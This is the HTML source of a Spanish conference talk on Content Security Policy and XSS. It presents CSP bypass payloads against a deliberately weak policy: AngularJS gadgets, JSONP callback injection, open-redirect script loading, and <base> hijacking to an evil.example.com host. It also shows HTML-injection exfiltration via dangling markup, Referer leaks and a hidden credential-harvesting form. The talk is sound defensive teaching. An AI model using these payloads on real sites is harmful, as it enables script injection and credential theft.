<!doctype html>
<html>

<head>
  <!-- vim: set ft=html: -->
  <!-- Force Neovim to use HTML as filetype, the `@for` from `@fortawesome` makes it think we are using angular...  -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

  <title>Content Security Policy ¿El fin de XSS?</title>

  <link rel="stylesheet" href="node_modules/reveal.js/dist/reset.css">
  <link rel="stylesheet" href="node_modules/reveal.js/dist/reveal.css">
  <link rel="stylesheet" href="node_modules/reveal.js/dist/theme/white.css">
  <link rel="stylesheet" href="css/custom.css">

  <!-- Theme used for syntax highlighting of code -->
  <link rel="stylesheet" href="node_modules/@highlightjs/cdn-assets/styles/atom-one-light.css">

  <!-- Fontawewome -->
  <link href="node_modules/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">

  <script src="js/start.js" defer></script>
</head>

<body>
  <div class="reveal">
    <div class="slides">

      <section>
        <h2>
          Antes de empezar...
        </h2>

        <table class="borderless">
          <tr>
            <td>
              <a href="?view=scroll">
                Scroll view
                <i class="fa-solid fa-mobile-screen"></i>
              </a>
              <br>
              <small>
                Si estás en un dispositivo móvil.
              </small>
            </td>
            <td>
              <a href="?view=fragment">
                Fragment view
                <i class="fa-solid fa-list"></i>
              </a>
              <br>
              <small>
                Tal como se ve en la presentación.
              </small>
            </td>
          </tr>
          <tr>
            <td>
              <a href="#" class="activate-speaker-mode">
                Speaker mode
                <i class="fa-regular fa-comments"></i>
              </a>
              <br>
              <small>
                Para ver las notas del presentador.
              </small>
            </td>
            <td>
              <a href="?print-pdf">
                Print mode
                <i class="fa-solid fa-print"></i>
              </a>
              <br>
              <small>
                Exportar a PDF.
              </small>
            </td>
          </tr>
          <tr>
            <td>
              <a href="#" class="show-search">
                Search
                <i class="fa-solid fa-magnifying-glass"></i>
              </a>
              <br>
              <small>
                Busca en la presentación (Ctrl + Shift + F).
              </small>
            </td>
            <td>
              <a href="#" class="show-shortcuts">
                Shortcuts
                <i class="fa-regular fa-circle-question"></i>
              </a>
            </td>
          </tr>
        </table>

        <p>
          Navega usando
          <button class="black-button go-to-next-slide">
            espacio
          </button>
        </p>
      </section>

      <section>
        <header>
          <h1>Content Security Policy</h1>
          <h2>¿El fin de XSS?</h2>
        </header>
        <p>
          <small>
            Santos Gallegos
            -
            <a href="mailto:stsewd@proton.me">
              stsewd@proton.me
            </a>
          </small>
          <br>
          <small>
            @stsewd
            <a href="https://github.com/stsewd" target="_blank"><i class="fab fa-github"></i></a>
            <a href="https://twitter.com/stsewd" target="_blank"><i class="fab fa-twitter"></i></a>
          </small>
        </p>

        <aside class="notes">
          Notes
        </aside>
      </section>

      <section>
        <h1>NO</h1>

        <p>
          Si la política es lo suficientemente restrictiva, será difícil pero no imposible llevar a cabo un ataque XSS.
        </p>
        <p>
          Inyectar HTML sin ejecutar JS puede tener impacto en la seguridad de la página,
          y es algo que CSP no siempre puede prevenir.
        </p>

        <aside class="notes">
          No, pero si la política es lo suficientemente restrictiva,
          será muy difícil (tal vez imposible) llevar a cabo un ataque XSS.
          Pero aún así, existen varios bypasses que pueden ser explotados.
          Usualmente cuando existe una vulnerabilidad XSS,
          es debido a que un atacante puede inyectar código HTML en el sitio,
          y eso aún tiene impacto en la seguridad de la página, y no es algo que CSP pueda prevenir
          (aún).

          Si no entendieron nada de lo que dije, no se preocupen, vamos
          a ver más en detalle por qué he llegado a esta conclusión.
        </aside>
      </section>

      <section>
        <h2>$ WHOAMI</h2>
        <ul>
          <li>Web developer</li>
          <li>Ethical hacker</li>
          <li><i class="fab fa-python"></i> <i class="fab fa-rust"></i></li>
          <li>
            @stsewd - <a href="https://stsewd.dev/" target="_blank">https://stsewd.dev/</a>
          </li>
        </ul>

        <p>
          <img src="img/rtd-logo-vertical.png" height="75px">
        </p>
        <aside class="notes">
          Hola, soy Santos Gallegos, soy desarrollador web, y hacker ético.
          Contribuyo activamente a proyectos open source,
          y he reportado vulnerabilidades en varios proyectos dentro y fuera de mi trabajo,
          como Neovim, GitPython, django-allauth, Read the Docs, Sentry, y un montón más.
          Principalmente trabajo con Python y Rust.
          Actualmente trabajo en Read the Docs, soy core developer.
          De vez en cuando también hago bug bounty.
          Me pueden encontrar en Internet como @stsewd.
        </aside>
      </section>

      <section>
        <h2>"Experto" en CSP y XSS</h2>

        <img src="img/experto.jpg" alt="" class="r-stretch">

        <aside class="notes">
          Ok, ya les conté un poco sobre mi, y parece que sé algo de seguridad web.
          Pero qué me hace un "experto" en CSP y XSS?

          Pues me puse a investigar anoche mientras preparaba esta charla.
        </aside>
      </section>

      <section>
        <h2>Mi experiencia con CSP</h2>

        <ul>
          <li>Había escuchado sobre CSP</li>
          <li>En el trabajo me tocó iniciar la implementación de CSP</li>
          <li>Bug bounty: XSS en una web con CSP usando nonces. No pude ejecutar JS, pero pude demostrar impacto</li>
          <li>Bug bounty: XSS en una web con CSP, muy restrictiva pero sin nonces. Puede hacer un bypass y ejeuctar JS
          </li>
          <li>Esta charla</li>
        </ul>

        <aside class="notes">
          No, mi experiencia con CSP es algo así.
          Había escuchado sobre CSP, tenía una idea muy básica de lo que era, y cómo funcionaba.
          Luego en el trabajo me tocó iniciar la implementación de CSP en nuestra web, en modo report-only, por ahora.
          Para ello tuve que investigar más sobre CSP, y los errores y bypasses más comunes.

          Y coincidentemente, unas semanas después, encontré un stored XSS en un web de un programa de bug bounty.
          Resulta que la web tenía una política muy restrictiva y usaban un nonce,
          luego de varios intentos, no pude encontrar un bypass para ejecutar JS,
          pero pude demostrar una manera de robar credenciales usando inyectando HTML sin ejecutar JS.

          Unas semanas después, encontré otro XSS en una web de un programa de bug bounty.
          La web tenía una política muy restrictiva, pero no usaban nonces,
          así que decidí investigar un poco más, y pude bypassar la política y ejecutar JS
          con la ayuda de otra vulnerabilidad que encontré en la web.

          Y por supuesto, tuve que investigar más sobre CSP para preparar esta charla.

          Así que no, no soy un experto, espero que al menos la mitad de lo que diga sea verdad.
          Pero si he tenido experiencia directa con CSP y XSS.
          Al final les voy a dejar links a recursos que me ayudaron a entender mejor el tema.
        </aside>
      </section>

      <section>
        <h2>¿Qué es CSP?</h2>
        <h3>Content-Security-Policy</h3>
        <p>
          Es una capa de seguridad adicional que ayuda a detectar y mitigar ciertos tipos de ataques,
          incluyendo Cross Site Scripting (XSS) y ataques de inyección de datos.
        </p>

        <small>
          <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank">
            https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
          </a>
        </small>

        <aside class="notes">
          Les he estado mencionando cosas como CSP, XSS, nonces,
          y tal vez se estén preguntando qué diablos estoy diciendo.

          Content security policy, o CSP, es una capa de seguridad adicional que ayuda a detectar y mitigar ciertos
          tipos de ataques, incluyendo Cross Site Scripting (XSS) y ataques de inyección de datos.

        </aside>
      </section>

      <section>
        <h2>
          ¿Cómo funciona CSP?
        </h2>

        <p>
          Mediante el header <code>Content-Security-Policy</code> que el servidor envía en la respuesta HTTP,
          este header contiene una serie de reglas que le indican al navegador qué recursos puede cargar y ejecutar en
          la página web.
        </p>

        <aside class="notes">
          Esto se hace mediante el header Content-Security-Policy que el servidor envía en la respuesta HTTP,
          este header contiene una serie de reglas que le indican al navegador qué recursos puede cargar y ejecutar en
          la página web.
        </aside>
      </section>

      <section>
        <h2>Sintaxis</h2>

        <p>
          <strong>Content-Security-Policy:</strong> &lt;directive&gt; &lt;value&gt;; &lt;directive&gt;
        </p>

        <aside class="notes">
          La sintaxis de CSP es la siguiente,
          tenemos el header Content-Security-Policy, seguido de una serie de directivas y valores.
          Cada directiva está separada por un punto y coma, y cada directiva puede tener uno o más valores separados por
          un espacio. o puede no tener valores.
        </aside>
      </section>

      <section>
        <h2>Sintaxis</h2>
        <pre class=""><code data-trim data-noescape class="http">
          Content-Security-Policy:
            default-src 'self' example.com *.example.com;
            upgrade-insecure-requests;
        </code></pre>
        <aside class="notes">
          Aquí tenemos un ejemplo de una política CSP,
          ahí vemos la directiva default-src,
          con varios valores, y luego la directiva upgrade-insecure-requests,
          la cual no tiene valores.

          El ejemplo está separado en varias líneas para que sea más fácil de leer,
          pero en la práctica, todo va en una sola línea.
        </aside>
      </section>

      <section>
        <h2>Directivas</h2>
        <ul>
          <li>Fetch directives: qué recursos se pueden cargar (scripts, imágenes, etc)</li>
          <li>Document directives: aspectos de un documento (HTML)</li>
          <li>Navigation directives: orígenes a los que un usuario puede navegar o enviar formularios</li>
          <li>Reporting directives: a dónde se envían los reportes de violaciones de CSP</li>
        </ul>
        <aside class="notes">
          Las directivas de CSP se dividen en varias categorías,
          Fetch directives, que controlan qué recursos se pueden cargar, como scripts, imágenes, CSS, qué APIs pueden
          ser usadas. Document directives, controlan aspectos de un documento HTML.
          Navigation directives, que controlan a qué orígenes un usuario puede navegar o enviar formularios.
          Y Reporting directives, que controlan a dónde se envían los reportes de violaciones de CSP.
        </aside>
      </section>

      <section>
        <h2>Valores</h2>
        <aside class="notes">
        </aside>
      </section>

      <section>
        <h2>Valores: keywords</h2>
        <ul>
          <li><code>'none'</code> - nada está permitido</li>
          <li><code>'self'</code> - sólo recursos del mismo origen están permitidos</li>
          <li><code>'unsafe-inline'</code> - código inline está permitido, CSS o JS</li>
        </ul>

        <aside class="notes">
          Son palabras que van entre comillas simples, las más comunes que tenemos son:

          - 'none': no se permite nada.
          - 'self': sólo se permite si es el mismo origen.
          - 'unsafe-inline': se permite código inline, como los atributos style y JavaScript inline.
        </aside>
      </section>

      <section>
        <h2>Valores: hosts</h2>
        <ul>
          <li><code>example.com</code> - host específico</li>
          <li><code>*.example.com</code> - wildcard</li>
          <li><code>https://example.com</code> - protocolo específico</li>
          <li><code>https://example.com/path/to/file</code> - path específico</li>
          <li><code>https://example.com/path/to/dir/</code> - directorio</li>
          <li><code>https:</code> - protocolo</li>
        </ul>
      </section>

      <section>
        <h2>Valores: nonce y hashes</h2>
        <ul>
          <li><code>'nonce-{random-value}'</code> - nonce</li>
          <li><code>'sha{algorithm}-{hash}'</code> - hash</li>
        </ul>

        <p><strong>Ejemplos:</strong></p>

        <ul>
          <li><code>'nonce-8IBTHwOdqNKAWeKl7plt8g=='</code></li>
          <li><code>'sha256-opnq3UrQLt34nD/Io3x4OQXex7rVCcRNO2/Dym9R8ro='</code></li>
        </ul>
      </section>

      <section>
        <h2>Directivas más comunes</h2>
        <ul>
          <li><code>default-src</code></li>
          <li><code>script-src</code></li>
          <li><code>style-src</code></li>
          <li><code>img-src</code></li>
          <li><code>connect-src</code></li>
        </ul>
        <aside class="notes">
        </aside>
      </section>

      <section>
        <h2>Previniendo ataques XSS</h2>
        <ul>
          <li>Lista de hosts, protocolos, y paths permitidos</li>
          <li>Nonce y hashes</li>
        </ul>
        <aside class="notes">
        </aside>
      </section>

      <section>
        <h2>Previniendo ataques XSS</h2>
        <p>No usar JavaScript</p>
        <p>
          Content-Security-Policy: script-src 'none'
        </p>

        <aside class="notes">
        </aside>
      </section>

      <section>
        <h2>CSP en acción</h2>
        <h4>
          Una triste historia
        </h4>
        <p>
          Tenemos una web que lleva varios años en producción, sin un mantenimiento constante,
          y con un montón de código JavaScript inline.
        </p>
        <p>
          <small>
            <em>
              <strong>
                Cuálquier parecido con la realidad es pura coincidencia.
              </strong>
            </em>
          </small>
        </p>
        <img src="img/imagination.jpg" alt="" class="r-stretch">
        <aside class="notes">
          Imaginemos que tenemos una web que ya lleva varios años en producción, y sin un mantenimiento constante,
          y tiene un montón de código JavaScript inline.
        </aside>
      </section>

      <section>
        <h2>La política (im)perfecta</h2>
        <pre class=""><code data-trim data-noescape class="http">
          Content-Security-Policy:
            script-src
              'self'
              'unsafe-inline'
              'unsafe-eval'
              https://www.google.com
              https://*.gstatic.com
              https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js;
        </code></pre>
        <aside class="notes">
          Lo que esta política nos dice es:

          - Se permite ejecutar código JavaScript si es del mismo origen.
          - Se permite código JavaScript inline (recordemos que la página web tiene mucho código JS inline).
          - Se permite el uso de la función eval, porque tenemos librerías que lo usan (angular.js)
          - Se permite cargar recursos de cualquier subdominio de google.com y gstatic.com,
          ya que estamos usando reCAPTCHA.
          Y por su puesto, confiamos en que Google no va a servir código malicioso.
          - Se permite cargar angular.js del CDN de Google.

          Con esta política la página web funciona correctamente.
          Pero no es muy restrictiva.
        </aside>
      </section>

      <section>
        <h2>La política (im)perfecta</h2>

        <img src="img/csp-evaluator.png" alt="">
        <small>
          <a href="https://csp-evaluator.withgoogle.com/" target="_blank">https://csp-evaluator.withgoogle.com/</a>
        </small>

        <aside class="notes">
          Y esto lo podemos comprobar con CSP Evaluator de Google.
          Como vemos, varias cosas están en rojo, ese color no es muy bueno.
          Tenemos menciones de `unsafe-inline`, `unsafe-eval`, y JSON-P, AngularJS.
        </aside>
      </section>

      <section>
        <h2>¿HTML injection?</h2>

        <pre class=""><code data-trim data-noescape class="python">
          @register.filter
          def gravatar(user):
              img = get_gravatar_image(user.email)
              return mark_safe(f'&lt;img src="{img}" alt="{user.email}"&gt;')
        </code></pre>
      </section>

      <section>
        <h2>Email address</h2>

        <p>
          &lt;script&gt;alert(document.domain)&lt;/script&gt;@example.com
        </p>

        <img src="img/django-email-validator-invalid.png" class="r-stretch">

        <aside class="notes">
          Esta dirección de correo electrónico no es válida.
        </aside>
      </section>

      <section>
        <h2>El atacante</h2>
        <img src="img/script-kiddie.jpg" alt="" class="r-stretch">
      </section>

      <section>
        <h2>Email address 101</h2>

        <p>
          local-part@domain
        </p>

        <blockquote>
          The local-part of the email address may be unquoted or may be enclosed in quotation marks.
        </blockquote>

        <p>
          <small>
            <a href="https://en.wikipedia.org/wiki/Email_address" target="_blank">
              https://en.wikipedia.org/wiki/Email_address
            </a>
          </small>
        </p>
      </section>

      <section>
        <h2>HTML injection</h2>

        <p>"&lt;script&gt;alert(document.domain)&lt;/script&gt;"@example.com</p>

        <img src="img/django-email-validator-valid.png" class="r-stretch">

        <p>
          <strong>
            Soportan quoted-string como local-part:
          </strong>
        </p>

        <ul>
          <li>validator.js</li>
          <li>Django</li>
        </ul>

      </section>

      <section>
        <h2>Inline JS</h2>

        <pre class=""><code data-trim data-noescape class="html">
          &lt;script&gt;
            alert(document.domain)
          &lt;/script&gt;
        </code></pre>

        <p>
          <small>
            <a href="examples/inline-js.html" target="_blank">examples/inline-js.html</a>
          </small>
        </p>

        <aside class="notes">
        </aside>
      </section>

      <section>
        <img src="img/later-six-months.jpg" alt="" class="r-stretch">

        <aside class="notes">
          Luego de un duro trabajo, logramos limpiar el sitio de código JavaScript inline.
        </aside>
      </section>

      <section>
        <h2><s>Inline JS</s></h2>

        <pre class=""><code data-trim data-noescape class="http">
          Content-Security-Policy:
            script-src
              'self'
              'unsafe-eval'
              https://www.google.com
              https://*.gstatic.com
              https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js;
        </code></pre>

        <p>
          <small>
            <a href="examples/inline-js-fixed.html" target="_blank">examples/inline-js-fixed.html</a>
          </small>
        </p>

        <aside class="notes">
        </aside>
      </section>

      <section>
        <img src="img/later-same-day.jpg" class="r-stretch">
      </section>

      <section>
        <h2>AngularJS</h2>

        <pre class=""><code data-trim data-noescape class="html">
          &lt;script src&equals;&quot;https&colon;&sol;&sol;ajax&period;googleapis&period;com&sol;ajax&sol;libs&sol;angularjs&sol;1&period;8&period;2&sol;angular&period;min&period;js&quot;&gt;&lt;&sol;script&gt;

          &lt;div ng-app&gt;
            &lt;input ng-focus&equals;&quot;&dollar;event&period;composedPath&lpar;&rpar;&verbar;orderBy&colon;&apos;alert&lpar;document&period;domain&rpar;&apos;&quot; value&equals;&quot;Click me&excl;&quot;&gt;
          &lt;&sol;div&gt;
        </code></pre>

        <p>
          <small>
            <a href="examples/angularjs.html" target="_blank">examples/angularjs.html</a>
          </small>
        </p>
      </section>

      <section>
        <img src="img/later-eternity.jpg" alt="" class="r-stretch">

        <aside class="notes">
          Luego de un duro trabajo, logramos limpiar el sitio de AngularJS,
          y pudimos eliminar la dependencia de AngularJS, y con ello también `unsafe-eval`.
          Tuvimos que reescribir todo el sitio, y para ello pues analizamos
          varias opciones para reemplazar AngularJS, opciones como React, Vue, Svelte.
          Y obviamente, escogimos la mejor opción, JQuery.
        </aside>
      </section>

      <section>
        <h2><s>AngularJS</s> JQuery</h2>

        <pre class=""><code data-trim data-noescape class="http">
          Content-Security-Policy:
            script-src
              'self'
              https://www.google.com
              https://*.gstatic.com
              https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js;
        </code></pre>

        <p>
          <small>
            <a href="examples/angularjs-fixed.html" target="_blank">examples/angularjs-fixed.html</a>
          </small>
        </p>

        <aside class="notes">
        </aside>
      </section>

      <section>
        <img src="img/later-same-day.jpg" class="r-stretch">
      </section>

      <section>
        <h2>JSON-P</h2>
        <p>
          JSON with padding, is a historical JavaScript technique for requesting data by loading a
          <code>&lt;script&gt;</code> element.
          JSON-P enables sharing of data bypassing same-origin policy.
        </p>

        <small>
          <a href="https://en.wikipedia.org/wiki/JSONP" target="_blank">https://en.wikipedia.org/wiki/JSONP</a>
        </small>
      </section>

      <section>
        <h2>CORS</h2>

        <img src="img/jsonp-grandma.jpg" class="r-stretch">

        <pre><code class="http">Access-Control-Allow-Origin: *</code></pre>

        <p>
          <small>
            <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" target="_blank">
              https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
            </a>
          </small>
        </p>

        <aside class="notes">
          Para los que no han usado JSON-P,
          tal vez hayan escuchado de CORS, Cross-Origin Resource Sharing,
          Cuando intentan usar una API de un sitio en otro sitio, y el navegador bloquea la petición
          con un error de CORS. Y Usualmente lo que hacen las personas para "arreglar" esto es
          agregar el header Access-Control-Allow-Origin: * en la respuesta HTTP.

          Esto es lo equivalente para lo se usaba JSON-P.
          Una técnica de hace medio siglo, según la Wikipedia.
        </aside>
      </section>

      <section>
        <h2>JSON-P</h2>
        <p>
          https://example.com/users/1234?callback=parseResponse
        </p>
        <pre><code class="javascript">parseResponse({"Name": "Clem", "Id": 1234, "Rank": 7});</code></pre>

        <p>
          https://example.com/users/1234?callback=alert(document.domain)//
        </p>
        <pre><code class="javascript">alert(document.domain)//({"Name": "Clem", "Id": 1234, "Rank": 7});</code></pre>

      </section>

      <section>
        <h2>JSON-P</h2>

        <pre class=""><code data-trim data-noescape class="html">
          &lt;script
              src&equals;&quot;https&colon;&sol;&sol;www&period;google&period;com&sol;complete&sol;search&quest;jsonp&equals;alert(document.domain)//&amp;client=chrome"&gt;
          &lt;&sol;script&gt;
        </code></pre>

        <p>
          <small>
            <a href="https://github.com/zigoo0/JSONBee" target="_blank">https://github.com/zigoo0/JSONBee</a>
          </small>
        </p>

        <p>
          <small>
            <a href="examples/jsonp.html" target="_blank">examples/jsonp.html</a>
          </small>
        </p>

        <aside class="notes">

        </aside>
      </section>

      <section>
        <h2>Recomendación de Google</h2>

        <img src="img/google-csp-recomendation.png" alt="" class="r-stretch">

        <p>
          <small>
            <a href="https://developers.google.com/recaptcha/docs/faq"
              target="_blank">https://developers.google.com/recaptcha/docs/faq</a>
          </small>
        </p>
      </section>

      <section>
        <img src="img/later-several-days.png" alt="" class="r-stretch">
      </section>

      <section>
        <h2><s>JSON-P</s></h2>

        <pre class=""><code data-trim data-noescape class="http">
          Content-Security-Policy:
            script-src
              'self'
              https://www.google.com/recaptcha/
              https://www.gstatic.com/recaptcha/
              https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js;
        </code></pre>

        <p>
          <small>
            <a href="examples/jsonp-fixed.html" target="_blank">examples/jsonp-fixed.html</a>
          </small>
        </p>

        <aside class="notes">
        </aside>
      </section>

      <section>
        <img src="img/later-same-day.jpg" class="r-stretch">
      </section>

      <section>
        <h2>Open redirect</h2>

        <p>
          https://example.com/login/?next=https://evil.example.com
        </p>

        <p>
          <small>
            <a href="examples/open-redirect.html" target="_blank">examples/open-redirect.html</a>
          </small>
        </p>

      </section>

      <section>
        <h2>CSP - paths y redirects</h2>

        <blockquote>
          To avoid leaking path information cross-origin, the matching algorithm ignores the path component
          of a source expression if the resource being loaded is the result of a redirect.
        </blockquote>

        <p>
          <small>
            <a href="https://www.w3.org/TR/CSP3/#source-list-paths-and-redirects" target="_blank">
              https://www.w3.org/TR/CSP3/#source-list-paths-and-redirects
            </a>
            <br>
            <br>
            <a href="https://homakov.blogspot.de/2014/01/using-content-security-policy-for-evil.html" target="_blank">
              https://homakov.blogspot.de/2014/01/using-content-security-policy-for-evil.html
            </a>
          </small>
        </p>
      </section>

      <section>
        <h2>Open redirect</h2>

        <pre class=""><code data-trim data-noescape class="html">
          &lt;script
            src&equals;&quot;&sol;&lowbar;&sol;redirect&sol;&quest;https&colon;&sol;&sol;cdn&period;jsdelivr&period;net&sol;gh&sol;stsewd&sol;charla-csp-xss&commat;main&sol;js&sol;test&period;js&quot;&gt;
          &lt;&sol;script&gt;
        </code></pre>

        <p>
          <small>
            <a href="examples/open-redirect-bypass.html" target="_blank">examples/open-redirect-bypass.html</a>
          </small>
        </p>

        <aside class="notes">
        </aside>
      </section>

      <section>
        <img src="img/later-six-hours.jpg" alt="">
        <aside class="notes">
        </aside>
      </section>

      <section>
        <h2>¡Open redirect arreglado!</h2>
        <h3>Y no más CDN público</h3>
        <pre class=""><code data-trim data-noescape class="http">
          Content-Security-Policy:
            script-src
              'self'
              https://www.google.com/recaptcha/
              https://www.gstatic.com/recaptcha/
              https://static.example.com/js/jquery@3.6.4/dist/jquery.min.js;
        </code></pre>

        <p>
          <small>
            <a href="examples/open-redirect-bypass-fixed.html"
              target="_blank">examples/open-redirect-bypass-fixed.html</a>
          </small>
        </p>
      </section>

      <section>
        <img src="img/later-same-day.jpg" class="r-stretch">
      </section>

      <section>
        <h2>¡AngularJS está de vuelta!</h2>

        <pre class=""><code data-trim data-noescape class="html">
          &lt;script src&equals;&quot;https&colon;&sol;&sol;www&period;google&period;com&sol;recaptcha&sol;about&sol;js&sol;main&period;min&period;js&quot;&gt;&lt;&sol;script&gt;

          &lt;div ng-app&gt;
            &lt;input ng-focus&equals;&quot;&dollar;event&period;composedPath&lpar;&rpar;&verbar;orderBy&colon;&apos;alert&lpar;document&period;domain&rpar;&apos;&quot; value&equals;&quot;Click me&excl;&quot;&gt;
          &lt;&sol;div&gt;
        </code></pre>

        <p>
          <small>
            <a href="examples/angularjs-is-back.html" target="_blank">examples/angularjs-is-back.html</a>
          </small>
        </p>
      </section>

      <section>
        <h2>Recomendación de Google</h2>

        <img src="img/google-csp-recomendation-nonce.png" alt="" class="r-stretch">

        <p>
          <small>
            <a href="https://developers.google.com/recaptcha/docs/faq"
              target="_blank">https://developers.google.com/recaptcha/docs/faq</a>
          </small>
        </p>
      </section>

      <section>
        <h2>Conclusión</h2>
        <p>
          Usar una lista de hosts permitidos no es suficiente para prevenir ataques XSS.
        </p>
      </section>

      <section>
        <h2>Nonce y hashes</h2>
        <pre class=""><code data-trim data-noescape class="http">
          Content-Security-Policy:
            script-src
              'nonce-8IBTHwOdqNKAWeKl7plt8g=='
              'sha256-opnq3UrQLt34nD/Io3x4OQXex7rVCcRNO2/Dym9R8ro=';
        </code></pre>

        <p>
          <small>
            <a href="examples/hash-and-nonce.html" target="_blank">examples/hash-and-nonce.html</a>
            <br>
            <a href="examples/hash-and-nonce-in-action.html" target="_blank">examples/hash-and-nonce-in-action.html</a>
          </small>
        </p>
      </section>

      <section>
        <h2>Ahora si estamos a salvo!</h2>
        <img src="img/safe-with-nonces.jpg" class="r-stretch">
      </section>

      <section>
        <h2>El tag <code>&lt;base&gt;</code></h2>

        <blockquote>
          The HTML <code>&lt;base&gt;</code> element specifies the base URL to use for all
          relative URLs contained within a document.
        </blockquote>
        <p>
          <small>
            <a href="https://devdoc.net/web/developer.mozilla.org/en-US/docs/Web/HTML/Element/base.html"
              target="_blank">https://devdoc.net/web/developer.mozilla.org/en-US/docs/Web/HTML/Element/base.html</a>
          </small>
        </p>
      </section>

      <section>
        <h2>El tag <code>&lt;base&gt;</code></h2>

        <pre class=""><code data-trim data-noescape class="html">
          &lt;base href&equals;&quot;https&colon;&sol;&sol;evil&period;example&period;com&sol;&quot;&gt;
        </code></pre>

        <p>
          <small>
            <a href="examples/base-uri-bypass.html" target="_blank">examples/base-uri-bypass.html</a>
            <br>
            <a href="examples/base-uri-bypass-fixed.html" target="_blank">examples/base-uri-bypass-fixed.html</a>
          </small>
        </p>
      </section>

      <section>
        <h2>Injection point dentro de &lt;script&gt;</h2>

        <pre class=""><code data-trim data-noescape class="html">
          &lt;script nonce&equals;&quot;abc&quot;&gt;
            &lcub;INJECTION&rcub;
          &lt;&sol;script&gt;
        </code></pre>
      </section>

      <section>
        <h2>Injection point entre nonce y src</h2>

        <pre class=""><code data-trim data-noescape class="html">
          &lt;script nonce&equals;&quot;abc&quot; &lcub;INJECTION&rcub; src&equals;&quot;good&period;js&quot;&gt;&lt;&sol;script&gt;
        </code></pre>

        <pre class=""><code data-trim data-noescape class="html">
          &lt;script nonce&equals;&quot;abc&quot; src&equals;&quot;https&colon;&sol;&sol;example&period;com&sol;evil&period;js&quot;&gt;
          &lt;&sol;script&gt;&quot; src&equals;&quot;good&period;js&quot;&gt;&lt;&sol;script&gt;
        </code></pre>

        <aside class="notes">
          Si el punto de inyección está depues del source, el script malicioso no se ejecutará.
          Ya que los navegadores no ejecutan el script si el script no está formado correctamente,
          eso también significa que si el script tiene más de un src, el script no se ejecutará.
        </aside>
      </section>

      <section>
        <h2>Re-uso de contenido de hashes</h2>

        <p>
          Si la política permite scripts correspondientes a un hash,
          el atacante también puede hacer uso de esos scripts.
        </p>

        <pre class=""><code data-trim data-noescape class="http">
          Content-Security-Policy:
            script-src
              'sha256-lZiRtFqX8+/xK+BIpUJiYLvM8k3Hmw2Lb+Efx61lknA=';
        </code></pre>

        <pre class=""><code data-trim data-noescape class="html">
            &lt;script&gt;deleteAccount&lpar;&rpar;&lt;&sol;script&gt;
        </code></pre>
      </section>

      <section>
        <h2>
          Malas implementaciones de nonce
        </h2>

        <ul>
          <li>Nonce estático o predecible</li>
          <li>Nonce semi-dinámico (no cambia en cada request)</li>
          <li>Inyectar el nonce automáticamente en cada script</li>
        </ul>
      </section>


      <section>
        <h2>Otras maneras de generar impacto sin ejecutar JS</h2>

        <ul>
          <li>Manipulación del contenido</li>
          <li>Redirecciones</li>
          <li>Exfiltración de información</li>
        </ul>
      </section>

      <section>
        <h2>Redirecciones</h2>

        <ul>
          <li>Redireccionamiento a un sitio malicioso</li>
          <li>Prevenir acceso al sitio</li>
        </ul>

        <pre class=""><code data-trim data-noescape class="html">
          &lt;meta http-equiv&equals;&quot;refresh&quot; content&equals;&quot;0&semi; url&equals;https&colon;&sol;&sol;example&period;com&sol;&quot; &sol;&gt;
        </code></pre>

        <p>
          <small>
            <a href="examples/html-injection-redirection.html"
              target="_blank">examples/html-injection-redirection.html</a>
          </small>
        </p>
      </section>

      <section>
        <h2>Filtración de URL via referer</h2>
        <p>
          Cuando se carga un recurso de un sitio, el navegador envía el header Referer con la URL
          del sitio que hizo la petición. La URL puede contener información sensible (OAuth tokens).
        </p>

        <pre class=""><code data-trim data-noescape class="html">
          &lt;img src&equals;&quot;https&colon;&sol;&sol;example&period;com&sol;&quot; referrerpolicy&equals;&quot;unsafe-url&quot;&gt;
        </code></pre>
        <p>
          <small>
            <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy"
              target="_blank">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy</a>
            <br>
            <br>
            <a href="examples/html-injection-url-exfiltration.html?code=12345"
              target="_blank">examples/html-injection-url-exfiltration.html</a>
          </small>
        </p>
      </section>

      <section>
        <h2>Filtración del contenido de la página</h2>
        <p>
          El atacante puede inyectar un recurso entre comillas sin cerrar,
          el navegador interpretará el contenido de la página como parte del recurso,
          hasta que encuentre el cierre de las comillas.
        </p>

        <pre class=""><code data-trim data-noescape class="html">
          &lt;img src&equals;&apos;https&colon;&sol;&sol;example&period;com&sol;
        </code></pre>
        <p>
          <small>
            <a href="examples/html-injection.html" target="_blank">examples/html-injection.html</a>
            <br>
            <a href="examples/html-injection-content-exfiltration.html"
              target="_blank">examples/html-injection-content-exfiltration.html</a>
          </small>
        </p>

        <aside class="notes">
          Con este ataque se podría filtrar el nonce,
          por eso es importante que el nonce sea único por cada request.
        </aside>
      </section>

      <section>
        <h2>Filtración de credenciales</h2>
        <p>
          Un atacante puede inyectar un formulario oculto en la página.
          El gestor de contraseñas puede llenarlo automáticamente.
          Si el usuario envía el formulario, el atacante recibirá las credenciales.
        </p>
      </section>

      <section>
        <h2>Filtración de credenciales</h2>
        <pre class=""><code data-trim data-noescape class="html">
          &lt;form action&equals;&quot;https&colon;&sol;&sol;example&period;com&sol;&quot;&gt;
            &lt;input name&equals;&quot;email&quot; style&equals;&quot;opacity&colon;0&semi;width&colon;0&quot;&gt;
            &lt;input type&equals;&quot;password&quot; name&equals;&quot;password&quot; style&equals;&quot;opacity&colon;0&semi;width&colon;0&quot;&gt;
            &lt;input type&equals;&quot;submit&quot; value&equals;&quot;Click me&excl;&quot;&gt;
          &lt;&sol;form&gt;
        </code></pre>

        <p>
          <small>
            <a href="examples/html-injection-credentials-exfiltration.html"
              target="_blank">examples/html-injection-credentials-exfiltration.html</a>
          </small>
        </p>
      </section>

      <section>
        <h2>Una buena política</h2>
        <p>
          Principio de privilegio mínimo
        </p>
        <p>
          <small>
            <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege" target="_blank">
              https://en.wikipedia.org/wiki/Principle_of_least_privilege
            </a>
